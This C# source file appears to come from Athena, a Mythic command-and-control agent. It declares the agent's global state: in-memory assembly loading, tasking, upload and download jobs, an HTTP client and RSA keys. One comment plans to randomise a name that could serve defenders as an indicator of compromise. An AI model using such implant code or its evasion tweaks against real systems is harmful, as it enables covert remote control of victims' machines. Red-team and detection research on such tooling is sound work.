using Athena.Mythic.Model;
using System.Collections.Generic;
using System.Net.Http;
using System.Runtime.Loader;
using System.Reflection;
using System.Threading;
using System.Security.Cryptography;
using Athena.Commands.Model;
using Athena.Mythic.Model.Response;

namespace Athena
{
    public class Globals
    {
        public static ExecuteAssemblyContext alc = new ExecuteAssemblyContext(); //Will need to randomize this name as it can be an IoC for Athena
        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
        public static bool encrypted = false;
        public static Dictionary<string, Assembly> loadedcommands = new Dictionary<string, Assembly>();
        public static Dictionary<string, MythicJob> jobs = new Dictionary<string, MythicJob>();
        public static Dictionary<string, MythicDownloadJob> downloadJobs = new Dictionary<string, MythicDownloadJob>();
        public static Dictionary<string, MythicUploadJob> uploadJobs = new Dictionary<string, MythicUploadJob>();
        public static Dictionary<string, string> outMessages = new Dictionary<string, string>();
        public static HttpClient client = new HttpClient();
        public static MythicClient mc;
        public static string executeAssemblyTask = "";
        public static Thread executeAseemblyThread;
        public static RSACryptoServiceProvider rsa;
        public static List<DelegateMessage> delegateMessage;
    }
}
